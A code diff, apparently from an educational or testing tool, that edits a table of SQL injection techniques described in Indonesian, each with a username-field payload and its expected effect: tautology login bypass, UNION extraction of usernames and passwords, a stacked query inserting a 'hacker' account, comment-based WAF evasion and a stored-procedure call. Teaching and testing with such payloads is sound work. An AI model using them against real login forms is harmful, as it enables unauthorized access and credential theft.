@@ -363,7 +363,7 @@
       ( "Illegal Query", "Menjalankan query dengan sintaks tidak valid / illegal", "' OR (SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b) -- ", "x", "", "Memicu error subquery atau join yang tidak valid." ),
       ( "Union Based", "Menggabungkan hasil query asli dengan query SELECT tambahan", "' UNION SELECT 1, username, password FROM users -- ", "x", "", "Mengekstrak data dari tabel users secara langsung ke layar." ),
       ( "Tautology", "Menggunakan kondisi logika OR yang selalu bernilai TRUE", "' OR '1'='1' -- ", "x", "", "Bypass login karena kueri menghasilkan nilai TRUE." ),
-      ( "Stored Procedure", "Memanggil fungsi atau prosedur bawaan database engine", "admin'; CALL sys.ps_setup_reload_saved() -- ", "x", "", "Mengeksekusi stored procedure bawaan database MySQL." ),
+      ( "Stored Procedure", "Memanggil fungsi atau prosedur bawaan database engine", "admin'; CALL sys.ps_setup_save() -- ", "x", "", "Mengeksekusi stored procedure bawaan database MySQL." ),
       ( "End-of-Line Comment", "Memotong sisa kueri password menggunakan tanda komentar", "admin' -- ", "x", "", "Mengabaikan verifikasi password dengan memotong sisa query." ),
       ( "Inline Comments", "Menggunakan komentar inline /**/ untuk memanipulasi parsing", "admin'/**/OR/**/'1'='1", "x", "", "Mengelabui pemrosesan parser atau WAF menggunakan inline comments." ),
       ( "Stacked Queries", "Menjalankan banyak kueri SQL menggunakan pemisah titik koma", "admin'; INSERT INTO users (username, password) VALUES ('hacker', 'hacker123'); -- ", "x", "", "Menambahkan kueri INSERT baru setelah kueri login." ),
